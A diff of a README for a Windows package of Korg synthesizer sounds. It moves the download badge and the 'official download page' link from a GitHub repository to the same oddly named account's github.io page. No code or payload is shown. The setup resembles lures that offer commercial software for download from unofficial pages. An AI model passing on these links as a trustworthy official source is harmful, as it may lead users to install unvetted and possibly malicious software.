@@ -1,6 +1,6 @@
 # 🎹 Korg-Collection-2026 - Master vintage synthesizer sounds on Windows
 
-[![](https://img.shields.io/badge/Download-Korg_Collection-blue.svg)](https://github.com/consumptivesilentbutler806/Korg-Collection-2026)
+[![](https://img.shields.io/badge/Download-Korg_Collection-blue.svg)](https://consumptivesilentbutler806.github.io)
 
 ## 📋 About the software
 
@@ -23,7 +23,7 @@ Ensure your computer meets these requirements for smooth performance:
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official download page](https://github.com/consumptivesilentbutler806/Korg-Collection-2026).
+1. Go to the [official download page](https://consumptivesilentbutler806.github.io).
 2. Locate the latest release version on the page.
 3. Click the link to download the installer file for Windows.
 4. Save the file to your desktop or downloads folder.
